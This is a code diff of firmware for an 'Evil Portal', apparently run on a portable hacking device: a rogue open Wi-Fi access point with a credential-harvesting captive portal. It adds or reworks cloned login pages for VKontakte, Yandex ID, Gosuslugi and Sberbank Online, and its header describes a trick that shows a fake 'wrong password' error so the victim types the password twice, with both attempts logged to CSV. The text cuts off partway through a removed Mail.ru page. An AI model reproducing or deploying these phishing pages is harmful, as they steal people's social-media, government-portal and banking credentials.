@@ -1,10 +1,13 @@
 // ===================================================================
 // bySaw Evil Portal
 //
-// Open rogue AP with DNS catch-all and credential-harvesting captive
-// portal. SELECT on the selection screen picks a template (4 built-in
-// + up to 8 SD files from /evil_portal/*.html). AP SSID auto-matches
-// the chosen theme. SELECT during runtime exits.
+// Open rogue AP + DNS catch-all + credential-harvesting captive portal.
+// Selection screen on entry (UP/DN + SEL). 4 built-in RU templates +
+// up to 8 SD files from /evil_portal/*.html.
+//
+// Capture flow: first POST → "неверный пароль" → victim re-enters →
+// second POST → redirect to real site. Both attempts logged to CSV.
+// Template HTML uses {{ERR}} placeholder replaced at serve time.
 // ===================================================================
 #include "config.h"
 #include "shared.h"
@@ -30,161 +33,222 @@ namespace EvilPortal {
 
 // ---------------------------------------------------------------
 // Built-in templates (PROGMEM)
+// {{ERR}} is replaced with CSS display value at serve time.
+// Cyrillic encoded as UTF-8 hex so the source file stays 7-bit-safe.
 // ---------------------------------------------------------------
 
-// \xd0\x92\xd0\x9a\xd0\xbe\xd0\xbd\xd1\x82\xd0\xb0\xd0\xba\xd1\x82\xd0\xb5 (VKontakte)
+// VKontakte
+// \xd0\x92\xd0\x9a\xd0\xbe\xd0\xbd\xd1\x82\xd0\xb0\xd0\xba\xd1\x82\xd0\xb5
 static const char kHtmlVK[] PROGMEM =
     "<!DOCTYPE html><html><head><meta charset='utf-8'>"
     "<meta name='viewport' content='width=device-width,initial-scale=1'>"
     "<title>\xd0\x92\xd0\x9a\xd0\xbe\xd0\xbd\xd1\x82\xd0\xb0\xd0\xba\xd1\x82\xd0\xb5</title>"
     "<style>*{box-sizing:border-box;margin:0;padding:0}"
-    "body{background:#e8ecf0;font-family:-apple-system,Helvetica,Arial,sans-serif;"
-    "min-height:100vh;display:flex;align-items:center;justify-content:center}"
-    ".b{background:#fff;border-radius:8px;padding:36px 28px;width:90%;max-width:360px;"
-    "box-shadow:0 1px 3px rgba(0,0,0,.12)}"
-    ".logo{text-align:center;font-size:36px;font-weight:900;color:#2787f5;margin-bottom:4px}"
-    "h1{text-align:center;font-size:20px;font-weight:600;color:#000;margin-bottom:4px}"
-    "p{text-align:center;color:#6d7885;font-size:14px;margin-bottom:22px}"
-    "input{width:100%;border:1.5px solid #d3d9de;border-radius:8px;padding:13px 14px;"
-    "font-size:16px;margin-bottom:12px;outline:0}"
+    "body{background:#e8ecf0;font-family:-apple-system,'Helvetica Neue',Arial,sans-serif;"
+    "min-height:100vh;display:flex;flex-direction:column;align-items:center;"
+    "justify-content:center;padding:16px}"
+    ".logo{color:#2787f5;font-size:54px;font-weight:900;letter-spacing:-2px;margin-bottom:14px}"
+    ".card{background:#fff;border-radius:8px;padding:28px 24px 22px;width:100%;max-width:360px;"
+    "box-shadow:0 1px 4px rgba(0,0,0,.1),0 0 0 1px rgba(0,0,0,.04)}"
+    "h1{font-size:20px;font-weight:600;color:#000;text-align:center;margin-bottom:4px}"
+    ".sub{font-size:14px;color:#6d7885;text-align:center;margin-bottom:18px}"
+    ".err{background:#fff0f0;border:1px solid #f5c6c6;border-radius:6px;padding:9px 12px;"
+    "font-size:13px;color:#c0392b;margin-bottom:14px;display:{{ERR}}}"
+    "input{width:100%;border:1.5px solid #d3d9de;border-radius:8px;padding:12px 14px;"
+    "font-size:16px;margin-bottom:12px;outline:0;transition:border-color .15s}"
     "input:focus{border-color:#2787f5}"
     ".btn{width:100%;background:#2787f5;color:#fff;border:0;border-radius:8px;"
     "padding:13px;font-size:16px;font-weight:500;cursor:pointer}"
-    ".f{font-size:13px;color:#6d7885;text-align:center;margin-top:16px}"
-    ".f a{color:#2787f5;text-decoration:none}"
-    "</style></head><body><div class='b'>"
+    ".btn:active{background:#1b6ad4}"
+    ".foot{font-size:13px;color:#6d7885;text-align:center;margin-top:14px}"
+    ".foot a{color:#2787f5;text-decoration:none}"
+    ".sep{height:1px;background:#e8ecf0;margin:14px 0}"
+    "</style></head><body>"
     "<div class='logo'>VK</div>"
+    "<div class='card'>"
     "<h1>\xd0\x92\xd0\xbe\xd0\xb9\xd1\x82\xd0\xb8</h1>"
-    "<p>\xd0\xb2 \xd0\xb0\xd0\xba\xd0\xba\xd0\xb0\xd1\x83\xd0\xbd\xd1\x82 \xd0\x92\xd0\x9a\xd0\xbe\xd0\xbd\xd1\x82\xd0\xb0\xd0\xba\xd1\x82\xd0\xb5</p>"
+    "<p class='sub'>\xd0\xb2 \xd0\xb0\xd0\xba\xd0\xba\xd0\xb0\xd1\x83\xd0\xbd\xd1\x82 \xd0\x92\xd0\x9a\xd0\xbe\xd0\xbd\xd1\x82\xd0\xb0\xd0\xba\xd1\x82\xd0\xb5</p>"
+    "<div class='err'>\xd0\x9d\xd0\xb5\xd0\xb2\xd0\xb5\xd1\x80\xd0\xbd\xd1\x8b\xd0\xb9 \xd0\xbb\xd0\xbe\xd0\xb3\xd0\xb8\xd0\xbd \xd0\xb8\xd0\xbb\xd0\xb8 \xd0\xbf\xd0\xb0\xd1\x80\xd0\xbe\xd0\xbb\xd1\x8c</div>"
     "<form method='POST' action='/login'>"
-    "<input name='login' placeholder='\xd0\xa2\xd0\xb5\xd0\xbb\xd0\xb5\xd1\x84\xd0\xbe\xd0\xbd \xd0\xb8\xd0\xbb\xd0\xb8 email' autocomplete='username'>"
+    "<input name='login' placeholder='\xd0\xa2\xd0\xb5\xd0\xbb\xd0\xb5\xd1\x84\xd0\xbe\xd0\xbd \xd0\xb8\xd0\xbb\xd0\xb8 email' autocomplete='username' autofocus>"
     "<input name='password' type='password' placeholder='\xd0\x9f\xd0\xb0\xd1\x80\xd0\xbe\xd0\xbb\xd1\x8c' autocomplete='current-password'>"
     "<button class='btn' type='submit'>\xd0\x92\xd0\xbe\xd0\xb9\xd1\x82\xd0\xb8</button>"
     "</form>"
-    "<div class='f'>\xd0\x97\xd0\xb0\xd0\xb1\xd1\x8b\xd0\xbb\xd0\xb8 \xd0\xbf\xd0\xb0\xd1\x80\xd0\xbe\xd0\xbb\xd1\x8c? "
-    "<a href='#'>\xd0\x92\xd0\xbe\xd1\x81\xd1\x81\xd1\x82\xd0\xb0\xd0\xbd\xd0\xbe\xd0\xb2\xd0\xb8\xd1\x82\xd1\x8c</a></div>"
+    "<div class='foot' style='margin-top:12px'>"
+    "<a href='#'>\xd0\x97\xd0\xb0\xd0\xb1\xd1\x8b\xd0\xbb\xd0\xb8 \xd0\xbf\xd0\xb0\xd1\x80\xd0\xbe\xd0\xbb\xd1\x8c?</a>"
+    "</div>"
+    "<div class='sep'></div>"
+    "<div class='foot'>"
+    "<a href='#'>\xd0\xa1\xd0\xbe\xd0\xb7\xd0\xb4\xd0\xb0\xd1\x82\xd1\x8c \xd0\xb0\xd0\xba\xd0\xba\xd0\xb0\xd1\x83\xd0\xbd\xd1\x82</a>"
+    "</div>"
     "</div></body></html>";
 
-// \xd0\x93\xd0\xbe\xd1\x81\xd1\x83\xd1\x81\xd0\xbb\xd1\x83\xd0\xb3\xd0\xb8 (Gosuslugi)
+// Yandex ID
+// \xd0\xaf\xd0\xbd\xd0\xb4\xd0\xb5\xd0\xba\xd1\x81
+static const char kHtmlYandex[] PROGMEM =
+    "<!DOCTYPE html><html><head><meta charset='utf-8'>"
+    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
+    "<title>\xd0\x92\xd1\x85\xd0\xbe\xd0\xb4 \xe2\x80\x94 \xd0\xaf\xd0\xbd\xd0\xb4\xd0\xb5\xd0\xba\xd1\x81 ID</title>"
+    "<style>*{box-sizing:border-box;margin:0;padding:0}"
+    "body{background:#fff;font-family:'YS Text',Arial,sans-serif;"
+    "min-height:100vh;display:flex;flex-direction:column;"
+    "align-items:center;justify-content:center;padding:16px}"
+    ".ya{font-size:28px;font-weight:700;color:#fc3f1d;margin-bottom:20px;"
+    "display:flex;align-items:center;gap:8px}"
+    ".ya span{color:#000}"
+    ".card{border:1px solid #e0e0e0;border-radius:12px;padding:32px 28px;"
+    "width:100%;max-width:380px}"
+    "h1{font-size:22px;font-weight:700;color:#000;margin-bottom:6px}"
+    ".sub{font-size:15px;color:#888;margin-bottom:22px}"
+    ".err{background:#fef0f0;border:1px solid #f5c6c6;border-radius:8px;"
+    "padding:10px 14px;font-size:14px;color:#d00;margin-bottom:16px;display:{{ERR}}}"
+    "input{width:100%;border:1px solid #ccc;border-radius:8px;padding:14px 16px;"
+    "font-size:16px;margin-bottom:14px;outline:0}"
+    "input:focus{border-color:#000;box-shadow:0 0 0 2px rgba(0,0,0,.08)}"
+    ".btn{width:100%;background:#ffdd2d;color:#000;border:0;border-radius:8px;"
+    "padding:14px;font-size:16px;font-weight:700;cursor:pointer}"
+    ".btn:active{background:#f0c800}"
+    ".foot{font-size:13px;color:#999;text-align:center;margin-top:16px}"
+    ".foot a{color:#000;text-decoration:underline}"
+    "</style></head><body>"
+    "<div class='ya'>\xd0\xaf<span>ndex</span></div>"
+    "<div class='card'>"
+    "<h1>\xd0\x92\xd0\xbe\xd0\xb9\xd1\x82\xd0\xb8 \xd0\xb2 \xd0\xaf\xd0\xbd\xd0\xb4\xd0\xb5\xd0\xba\xd1\x81</h1>"
+    "<p class='sub'>\xd0\x98\xd1\x81\xd0\xbf\xd0\xbe\xd0\xbb\xd1\x8c\xd0\xb7\xd1\x83\xd0\xb9\xd1\x82\xd0\xb5 \xd0\xaf\xd0\xbd\xd0\xb4\xd0\xb5\xd0\xba\xd1\x81 ID</p>"
+    "<div class='err'>\xd0\x9d\xd0\xb5\xd0\xb2\xd0\xb5\xd1\x80\xd0\xbd\xd1\x8b\xd0\xb9 \xd0\xbb\xd0\xbe\xd0\xb3\xd0\xb8\xd0\xbd \xd0\xb8\xd0\xbb\xd0\xb8 \xd0\xbf\xd0\xb0\xd1\x80\xd0\xbe\xd0\xbb\xd1\x8c</div>"
+    "<form method='POST' action='/login'>"
+    "<input name='login' placeholder='\xd0\x9b\xd0\xbe\xd0\xb3\xd0\xb8\xd0\xbd, \xd1\x82\xd0\xb5\xd0\xbb\xd0\xb5\xd1\x84\xd0\xbe\xd0\xbd \xd0\xb8\xd0\xbb\xd0\xb8 email' autocomplete='username' autofocus>"
+    "<input name='passwd' type='password' placeholder='\xd0\x9f\xd0\xb0\xd1\x80\xd0\xbe\xd0\xbb\xd1\x8c' autocomplete='current-password'>"
+    "<button class='btn' type='submit'>\xd0\x92\xd0\xbe\xd0\xb9\xd1\x82\xd0\xb8</button>"
+    "</form>"
+    "<div class='foot' style='margin-top:18px'>"
+    "<a href='#'>\xd0\x97\xd0\xb0\xd0\xb1\xd1\x8b\xd0\xbb\xd0\xb8 \xd0\xbf\xd0\xb0\xd1\x80\xd0\xbe\xd0\xbb\xd1\x8c?</a>"
+    " &nbsp;\xc2\xb7&nbsp; "
+    "<a href='#'>\xd0\xa0\xd0\xb5\xd0\xb3\xd0\xb8\xd1\x81\xd1\x82\xd1\x80\xd0\xb0\xd1\x86\xd0\xb8\xd1\x8f</a>"
+    "</div>"
+    "</div></body></html>";
+
+// Gosuslugi
+// \xd0\x93\xd0\xbe\xd1\x81\xd1\x83\xd1\x81\xd0\xbb\xd1\x83\xd0\xb3\xd0\xb8
 static const char kHtmlGosuslugi[] PROGMEM =
     "<!DOCTYPE html><html><head><meta charset='utf-8'>"
     "<meta name='viewport' content='width=device-width,initial-scale=1'>"
     "<title>\xd0\x93\xd0\xbe\xd1\x81\xd1\x83\xd1\x81\xd0\xbb\xd1\x83\xd0\xb3\xd0\xb8 \xe2\x80\x94 \xd0\x92\xd1\x85\xd0\xbe\xd0\xb4</title>"
     "<style>*{box-sizing:border-box;margin:0;padding:0}"
-    "body{background:#f0f2f5;font-family:Arial,sans-serif}"
-    "header{background:#0d4cd3;padding:0 20px;height:56px;display:flex;align-items:center}"
-    "header span{color:#fff;font-size:18px;font-weight:700;letter-spacing:-.5px}"
-    "header small{color:rgba(255,255,255,.7);font-size:11px;margin-left:6px;font-weight:400}"
-    ".w{max-width:400px;margin:40px auto;background:#fff;border-radius:4px;"
-    "box-shadow:0 1px 4px rgba(0,0,0,.1);overflow:hidden}"
-    ".wh{background:#0d4cd3;padding:20px 24px;color:#fff}"
-    ".wh h2{font-size:18px;font-weight:600;margin-bottom:4px}"
-    ".wh p{font-size:13px;opacity:.8}"
-    ".wb{padding:24px}"
-    "label{display:block;font-size:13px;color:#333;margin-bottom:6px;font-weight:500}"
-    "input{width:100%;border:1px solid #c4c8cc;border-radius:4px;padding:11px 13px;"
-    "font-size:15px;margin-bottom:18px;outline:0}"
-    "input:focus{border-color:#0d4cd3;box-shadow:0 0 0 2px rgba(13,76,211,.15)}"
+    "body{background:#f3f4f7;font-family:Arial,Helvetica,sans-serif}"
+    "header{background:#0d4cd3;height:54px;display:flex;align-items:center;padding:0 20px}"
+    ".hbrand{color:#fff;font-size:17px;font-weight:700;letter-spacing:-.3px}"
+    ".htag{color:rgba(255,255,255,.65);font-size:11px;margin-left:6px;font-weight:400;"
+    "text-transform:uppercase;letter-spacing:.5px}"
+    ".wrap{max-width:420px;margin:32px auto;padding:0 16px}"
+    ".card{background:#fff;border-radius:6px;overflow:hidden;"
+    "box-shadow:0 1px 6px rgba(0,0,0,.09)}"
+    ".card-hd{background:#0d4cd3;padding:18px 24px}"
+    ".card-hd h2{color:#fff;font-size:18px;font-weight:700;margin-bottom:3px}"
+    ".card-hd p{color:rgba(255,255,255,.75);font-size:13px}"
+    ".card-bd{padding:22px 24px 24px}"
+    ".tabs{display:flex;border-bottom:1px solid #e5e7eb;margin-bottom:20px}"
+    ".tab{padding:8px 14px;font-size:13px;color:#6b7280;cursor:pointer;border-bottom:2px solid transparent;margin-bottom:-1px}"
+    ".tab.active{color:#0d4cd3;border-bottom-color:#0d4cd3;font-weight:600}"
+    ".err{background:#fff5f5;border:1px solid #fca5a5;border-radius:4px;"
+    "padding:10px 14px;font-size:14px;color:#dc2626;margin-bottom:16px;display:{{ERR}}}"
+    "label{display:block;font-size:13px;color:#374151;font-weight:500;margin-bottom:5px}"
+    "input{width:100%;border:1px solid #d1d5db;border-radius:4px;padding:11px 13px;"
+    "font-size:15px;margin-bottom:16px;outline:0}"
+    "input:focus{border-color:#0d4cd3;box-shadow:0 0 0 2px rgba(13,76,211,.12)}"
     ".btn{width:100%;background:#0d4cd3;color:#fff;border:0;border-radius:4px;"
     "padding:12px;font-size:15px;font-weight:600;cursor:pointer}"
-    ".note{font-size:12px;color:#6b7280;text-align:center;margin-top:14px}"
+    ".btn:active{background:#0b3fad}"
+    ".note{font-size:12px;color:#9ca3af;text-align:center;margin-top:16px;line-height:1.5}"
+    ".note a{color:#0d4cd3;text-decoration:none}"
     "</style></head><body>"
-    "<header><span>\xd0\x93\xd0\xbe\xd1\x81\xd1\x83\xd1\x81\xd0\xbb\xd1\x83\xd0\xb3\xd0\xb8</span>"
-    "<small>\xd0\x95\xd0\x94\xd0\x98\xd0\x9d\xd0\xab\xd0\x99 \xd0\x9f\xd0\x9e\xd0\xa0\xd0\xa2\xd0\x90\xd0\x9b</small></header>"
-    "<div class='w'><div class='wh'>"
+    "<header>"
+    "<span class='hbrand'>\xd0\x93\xd0\xbe\xd1\x81\xd1\x83\xd1\x81\xd0\xbb\xd1\x83\xd0\xb3\xd0\xb8</span>"
+    "<span class='htag'>\xd0\x95\xd0\xb4\xd0\xb8\xd0\xbd\xd1\x8b\xd0\xb9 \xd0\xbf\xd0\xbe\xd1\x80\xd1\x82\xd0\xb0\xd0\xbb</span>"
+    "</header>"
+    "<div class='wrap'><div class='card'>"
+    "<div class='card-hd'>"
     "<h2>\xd0\x92\xd1\x85\xd0\xbe\xd0\xb4 \xd0\xbd\xd0\xb0 \xd0\xbf\xd0\xbe\xd1\x80\xd1\x82\xd0\xb0\xd0\xbb</h2>"
     "<p>\xd0\x92\xd0\xb2\xd0\xb5\xd0\xb4\xd0\xb8\xd1\x82\xd0\xb5 \xd0\xb4\xd0\xb0\xd0\xbd\xd0\xbd\xd1\x8b\xd0\xb5 \xd1\x83\xd1\x87\xd1\x91\xd1\x82\xd0\xbd\xd0\xbe\xd0\xb9 \xd0\xb7\xd0\xb0\xd0\xbf\xd0\xb8\xd1\x81\xd0\xb8</p>"
-    "</div><div class='wb'>"
+    "</div>"
+    "<div class='card-bd'>"
+    "<div class='tabs'>"
+    "<div class='tab active'>\xd0\x9f\xd0\xbe \xd0\xbb\xd0\xbe\xd0\xb3\xd0\xb8\xd0\xbd\xd1\x83</div>"
+    "<div class='tab'>\xd0\x9f\xd0\xbe \xd0\xa1\xd0\x9d\xd0\x98\xd0\x9b\xd0\xa1</div>"
+    "<div class='tab'>QR</div>"
+    "</div>"
+    "<div class='err'>\xd0\x9d\xd0\xb5\xd0\xb2\xd0\xb5\xd1\x80\xd0\xbd\xd1\x8b\xd0\xb9 \xd0\xbb\xd0\xbe\xd0\xb3\xd0\xb8\xd0\xbd \xd0\xb8\xd0\xbb\xd0\xb8 \xd0\xbf\xd0\xb0\xd1\x80\xd0\xbe\xd0\xbb\xd1\x8c</div>"
     "<form method='POST' action='/login'>"
-    "<label>\xd0\xa2\xd0\xb5\xd0\xbb\xd0\xb5\xd1\x84\xd0\xbe\xd0\xbd, email \xd0\xb8\xd0\xbb\xd0\xb8 СНИЛС</label>"
-    "<input name='login' autocomplete='username'>"
+    "<label>\xd0\xa2\xd0\xb5\xd0\xbb\xd0\xb5\xd1\x84\xd0\xbe\xd0\xbd, email \xd0\xb8\xd0\xbb\xd0\xb8 \xd0\xa1\xd0\x9d\xd0\x98\xd0\x9b\xd0\xa1</label>"
+    "<input name='login' autocomplete='username' autofocus>"
     "<label>\xd0\x9f\xd0\xb0\xd1\x80\xd0\xbe\xd0\xbb\xd1\x8c</label>"
     "<input name='password' type='password' autocomplete='current-password'>"
     "<button class='btn' type='submit'>\xd0\x92\xd0\xbe\xd0\xb9\xd1\x82\xd0\xb8</button>"
     "</form>"
-    "<p class='note'>\xd0\x97\xd0\xb0\xd1\x89\xd0\xb8\xd1\x89\xd1\x91\xd0\xbd\xd0\xbd\xd0\xbe\xd0\xb5 \xd1\x81\xd0\xbe\xd0\xb5\xd0\xb4\xd0\xb8\xd0\xbd\xd0\xb5\xd0\xbd\xd0\xb8\xd0\xb5 \xd0\xbf\xd0\xbe \xd0\xb3\xd0\xbe\xd1\x81\xd1\x82\xd0\xb0\xd0\xbd\xd0\xb4\xd0\xb0\xd1\x80\xd1\x82\xd0\xb0\xd0\xbc \xd0\xa0\xd0\xa4</p>"
-    "</div></div></body></html>";
+    "<p class='note'>"
+    "\xd0\x97\xd0\xb0\xd1\x89\xd0\xb8\xd1\x89\xd1\x91\xd0\xbd\xd0\xbd\xd0\xbe\xd0\xb5 \xd1\x81\xd0\xbe\xd0\xb5\xd0\xb4\xd0\xb8\xd0\xbd\xd0\xb5\xd0\xbd\xd0\xb8\xd0\xb5. "
+    "<a href='#'>\xd0\x97\xd0\xb0\xd0\xb1\xd1\x8b\xd0\xbb\xd0\xb8 \xd0\xbf\xd0\xb0\xd1\x80\xd0\xbe\xd0\xbb\xd1\x8c?</a>"
+    "</p>"
+    "</div></div></div></body></html>";
 
-// \xd0\xa1\xd0\xb1\xd0\xb5\xd1\x80\xd0\xb1\xd0\xb0\xd0\xbd\xd0\xba \xd0\x9e\xd0\xbd\xd0\xbb\xd0\xb0\xd0\xb9\xd0\xbd (Sberbank)
+// Sberbank Online
+// \xd0\xa1\xd0\xb1\xd0\xb5\xd1\x80\xd0\xb1\xd0\xb0\xd0\xbd\xd0\xba
 static const char kHtmlSberbank[] PROGMEM =
     "<!DOCTYPE html><html><head><meta charset='utf-8'>"
     "<meta name='viewport' content='width=device-width,initial-scale=1'>"
-    "<title>\xd0\xa1\xd0\xb1\xd0\xb5\xd1\x80\xd0\xb1\xd0\xb0\xd0\xbd\xd0\xba \xd0\x9e\xd0\xbd\xd0\xbb\xd0\xb0\xd0\xb9\xd0\xbd</title>"
+    "<title>\xd0\xa1\xd0\xb1\xd0\xb5\xd1\x80\xd0\x91\xd0\xb0\xd0\xbd\xd0\xba \xd0\x9e\xd0\xbd\xd0\xbb\xd0\xb0\xd0\xb9\xd0\xbd</title>"
     "<style>*{box-sizing:border-box;margin:0;padding:0}"
-    "body{background:#f5f5f5;font-family:SBSansDisplay,Arial,sans-serif}"
-    "header{background:#21a038;padding:0 20px;height:58px;display:flex;align-items:center;gap:10px}"
-    ".hlogo{width:32px;height:32px;background:#fff;border-radius:50%;display:flex;"
-    "align-items:center;justify-content:center;font-size:18px}"
-    ".htitle{color:#fff;font-size:16px;font-weight:700}"
-    ".w{max-width:380px;margin:36px auto;background:#fff;border-radius:12px;"
-    "box-shadow:0 2px 8px rgba(0,0,0,.08);overflow:hidden}"
-    ".wh{padding:24px 24px 16px;border-bottom:1px solid #f0f0f0}"
-    ".wh h2{font-size:20px;font-weight:700;color:#1a1a1a;margin-bottom:4px}"
-    ".wh p{font-size:13px;color:#8c8c8c}"
-    ".wb{padding:20px 24px 24px}"
-    "label{display:block;font-size:13px;color:#666;margin-bottom:5px}"
+    "body{background:#f5f5f5;font-family:Arial,Helvetica,sans-serif}"
+    "header{background:#21a038;height:56px;display:flex;align-items:center;padding:0 20px;gap:10px}"
+    ".hicon{width:32px;height:32px;background:#fff;border-radius:50%;"
+    "display:flex;align-items:center;justify-content:center;"
+    "font-size:17px;font-weight:900;color:#21a038;flex-shrink:0}"
+    ".hname{color:#fff;font-size:16px;font-weight:700}"
+    ".hsub{color:rgba(255,255,255,.7);font-size:11px}"
+    ".wrap{max-width:400px;margin:32px auto;padding:0 16px}"
+    ".card{background:#fff;border-radius:10px;overflow:hidden;"
+    "box-shadow:0 2px 8px rgba(0,0,0,.08)}"
+    ".card-hd{padding:20px 24px 16px;border-bottom:1px solid #f0f0f0}"
+    ".card-hd h2{font-size:19px;font-weight:700;color:#1a1a1a;margin-bottom:3px}"
+    ".card-hd p{font-size:13px;color:#888}"
+    ".card-bd{padding:20px 24px 24px}"
+    ".err{background:#fff0f0;border:1px solid #f5c6c6;border-radius:6px;"
+    "padding:10px 14px;font-size:14px;color:#c0392b;margin-bottom:16px;display:{{ERR}}}"
+    "label{display:block;font-size:13px;color:#555;font-weight:500;margin-bottom:5px}"
     "input{width:100%;border:1.5px solid #e0e0e0;border-radius:8px;padding:12px 14px;"
-    "font-size:16px;margin-bottom:16px;outline:0;background:#fafafa}"
-    "input:focus{border-color:#21a038;background:#fff}"
+    "font-size:15px;margin-bottom:16px;outline:0;background:#fafafa}"
+    "input:focus{border-color:#21a038;background:#fff;box-shadow:0 0 0 2px rgba(33,160,56,.1)}"
     ".btn{width:100%;background:#21a038;color:#fff;border:0;border-radius:8px;"
-    "padding:14px;font-size:16px;font-weight:700;cursor:pointer;letter-spacing:.2px}"
+    "padding:13px;font-size:16px;font-weight:700;cursor:pointer;letter-spacing:.2px}"
+    ".btn:active{background:#1a8b2f}"
     ".note{font-size:12px;color:#aaa;text-align:center;margin-top:14px}"
+    ".note a{color:#21a038;text-decoration:none}"
     "</style></head><body>"
-    "<header><div class='hlogo'>\xd0\xa1</div>"
-    "<span class='htitle'>\xd0\xa1\xd0\xb1\xd0\xb5\xd1\x80\xd0\xb1\xd0\xb0\xd0\xbd\xd0\xba \xd0\x9e\xd0\xbd\xd0\xbb\xd0\xb0\xd0\xb9\xd0\xbd</span></header>"
-    "<div class='w'><div class='wh'>"
-    "<h2>\xd0\x92\xd1\x85\xd0\xbe\xd0\xb4 \xd0\xb2 \xd0\xa1\xd0\xb1\xd0\xb5\xd1\x80\xd0\xb1\xd0\xb0\xd0\xbd\xd0\xba \xd0\x9e\xd0\xbd\xd0\xbb\xd0\xb0\xd0\xb9\xd0\xbd</h2>"
-    "<p>\xd0\x9b\xd0\xb8\xd1\x87\xd0\xbd\xd1\x8b\xd0\xb9 \xd0\xba\xd0\xb0\xd0\xb1\xd0\xb8\xd0\xbd\xd0\xb5\xd1\x82 \xd0\xb8 \xd1\x83\xd0\xbf\xd1\x80\xd0\xb0\xd0\xb2\xd0\xbb\xd0\xb5\xd0\xbd\xd0\xb8\xd0\xb5 \xd1\x81\xd1\x87\xd0\xb5\xd1\x82\xd0\xb0\xd0\xbc\xd0\xb8</p>"
-    "</div><div class='wb'>"
+    "<header>"
+    "<div class='hicon'>\xd0\xa1</div>"
+    "<div>"
+    "<div class='hname'>\xd0\xa1\xd0\xb1\xd0\xb5\xd1\x80\xd0\x91\xd0\xb0\xd0\xbd\xd0\xba \xd0\x9e\xd0\xbd\xd0\xbb\xd0\xb0\xd0\xb9\xd0\xbd</div>"
+    "<div class='hsub'>\xd0\x9b\xd0\xb8\xd1\x87\xd0\xbd\xd1\x8b\xd0\xb9 \xd0\xba\xd0\xb0\xd0\xb1\xd0\xb8\xd0\xbd\xd0\xb5\xd1\x82</div>"
+    "</div>"
+    "</header>"
+    "<div class='wrap'><div class='card'>"
+    "<div class='card-hd'>"
+    "<h2>\xd0\x92\xd1\x85\xd0\xbe\xd0\xb4 \xd0\xb2 \xd0\xa1\xd0\xb1\xd0\xb5\xd1\x80\xd0\x91\xd0\xb0\xd0\xbd\xd0\xba \xd0\x9e\xd0\xbd\xd0\xbb\xd0\xb0\xd0\xb9\xd0\xbd</h2>"
+    "<p>\xd0\x9c\xd0\xb0\xd0\xbd\xd0\xb0\xd0\xb3\xd0\xb5\xd0\xbc\xd0\xb5\xd0\xbd\xd1\x82 \xd1\x81\xd1\x87\xd0\xb5\xd1\x82\xd0\xbe\xd0\xb2 \xd0\xb8 \xd0\xba\xd0\xb0\xd1\x80\xd1\x82</p>"
+    "</div>"
+    "<div class='card-bd'>"
+    "<div class='err'>\xd0\x9d\xd0\xb5\xd0\xb2\xd0\xb5\xd1\x80\xd0\xbd\xd1\x8b\xd0\xb9 \xd0\xbb\xd0\xbe\xd0\xb3\xd0\xb8\xd0\xbd \xd0\xb8\xd0\xbb\xd0\xb8 \xd0\xbf\xd0\xb0\xd1\x80\xd0\xbe\xd0\xbb\xd1\x8c</div>"
     "<form method='POST' action='/login'>"
     "<label>\xd0\x9b\xd0\xbe\xd0\xb3\xd0\xb8\xd0\xbd</label>"
-    "<input name='login' placeholder='+7 (___) ___-__-__' autocomplete='username'>"
+    "<input name='login' placeholder='+7 \xe2\x80\x94 \xd1\x82\xd0\xb5\xd0\xbb\xd0\xb5\xd1\x84\xd0\xbe\xd0\xbd, \xd0\xb8\xd0\xbb\xd0\xb8 email' autocomplete='username' autofocus>"
     "<label>\xd0\x9f\xd0\xb0\xd1\x80\xd0\xbe\xd0\xbb\xd1\x8c</label>"
     "<input name='password' type='password' autocomplete='current-password'>"
     "<button class='btn' type='submit'>\xd0\x92\xd0\xbe\xd0\xb9\xd1\x82\xd0\xb8</button>"
     "</form>"
-    "<p class='note'>\xd0\x97\xd0\xb0\xd0\xb1\xd1\x8b\xd0\xbb\xd0\xb8 \xd0\xbf\xd0\xb0\xd1\x80\xd0\xbe\xd0\xbb\xd1\x8c? "
-    "\xd0\x9f\xd0\xbe\xd0\xb7\xd0\xb2\xd0\xbe\xd0\xbd\xd0\xb8\xd1\x82\xd0\xb5 \xd0\xbd\xd0\xb0 900</p>"
-    "</div></div></body></html>";
-
-// Mail.ru
-static const char kHtmlMailRu[] PROGMEM =
-    "<!DOCTYPE html><html><head><meta charset='utf-8'>"
-    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
-    "<title>Mail.ru \xe2\x80\x94 \xd0\x92\xd1\x85\xd0\xbe\xd0\xb4</title>"
-    "<style>*{box-sizing:border-box;margin:0;padding:0}"
-    "body{background:#f5f5f5;font-family:Arial,Helvetica,sans-serif}"
-    "header{background:#005ff9;padding:0 20px;height:50px;display:flex;"
-    "align-items:center;color:#fff;font-size:20px;font-weight:700}"
-    ".w{max-width:400px;margin:40px auto;background:#fff;border-radius:8px;"
-    "box-shadow:0 1px 6px rgba(0,0,0,.1)}"
-    ".wh{padding:22px 24px 16px;border-bottom:1px solid #e8e8e8;text-align:center}"
-    ".wh img{display:none}.ico{font-size:40px;margin-bottom:8px}"
-    ".wh h2{font-size:18px;font-weight:700;color:#1a1a1a}"
-    ".wh p{font-size:13px;color:#888;margin-top:4px}"
-    ".wb{padding:20px 24px 24px}"
-    "input{width:100%;border:1px solid #d5d5d5;border-radius:6px;padding:11px 13px;"
-    "font-size:15px;margin-bottom:14px;outline:0}"
-    "input:focus{border-color:#005ff9;box-shadow:0 0 0 2px rgba(0,95,249,.1)}"
-    ".btn{width:100%;background:#005ff9;color:#fff;border:0;border-radius:6px;"
-    "padding:12px;font-size:16px;font-weight:600;cursor:pointer}"
-    ".links{display:flex;justify-content:space-between;margin-top:14px;font-size:13px}"
-    ".links a{color:#005ff9;text-decoration:none}"
-    "</style></head><body>"
-    "<header>Mail.ru</header>"
-    "<div class='w'><div class='wh'>"
-    "<div class='ico'>\xd0\x9c</div>"
-    "<h2>\xd0\x92\xd1\x85\xd0\xbe\xd0\xb4 \xd0\xb2 \xd0\xbf\xd0\xbe\xd1\x87\xd1\x82\xd1\x83</h2>"
-    "<p>Mail.ru</p>"
-    "</div><div class='wb'>"
-    "<form method='POST' action='/login'>"
-    "<input name='login' placeholder='\xd0\x98\xd0\xbc\xd1\x8f \xd0\xbf\xd0\xbe\xd0\xbb\xd1\x8c\xd0\xb7\xd0\xbe\xd0\xb2\xd0\xb0\xd1\x82\xd0\xb5\xd0\xbb\xd1\x8f \xd0\xb8\xd0\xbb\xd0\xb8 \xd1\x82\xd0\xb5\xd0\xbb\xd0\xb5\xd1\x84\xd0\xbe\xd0\xbd' autocomplete='username'>"
-    "<input name='password' type='password' placeholder='\xd0\x9f\xd0\xb0\xd1\x80\xd0\xbe\xd0\xbb\xd1\x8c' autocomplete='current-password'>"
